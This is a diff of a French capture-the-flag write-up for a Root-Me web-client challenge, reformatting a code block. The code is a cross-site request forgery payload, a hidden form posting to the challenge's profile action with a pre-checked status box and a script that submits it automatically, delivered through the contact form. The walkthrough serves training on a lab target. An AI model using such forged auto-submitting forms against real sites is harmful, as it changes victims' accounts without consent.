@@ -16,12 +16,14 @@ en observant le code source de la page profile, on observe que celle-ci correspo
 On vas alors envoyer le forms directement par message et ce via l'onglet contact. On vas retoucher légèrement le code du forms, mettant l'url complet et en ajoutant l'argument "checked" au chackbox et nous allons rajoutant un element script pour l'appeler.
 on as donc le code ci-dessous :
 
-* <form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
-* 	<input type="text" name="username" value="zeobuilder10">
-* 	<input type="checkbox" name="status" checked >
-* 	<button type="submit">Submit</button>
-* </form>
-* <script>document.getElementById("form").submit()</script>
+```html
+<form id="form" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+ 	<input type="text" name="username" value="zeobuilder10">
+ 	<input type="checkbox" name="status" checked >
+  <button type="submit">Submit</button>
+</form>
+<script>document.getElementById("form").submit()</script>
+```
 
 soit :
 
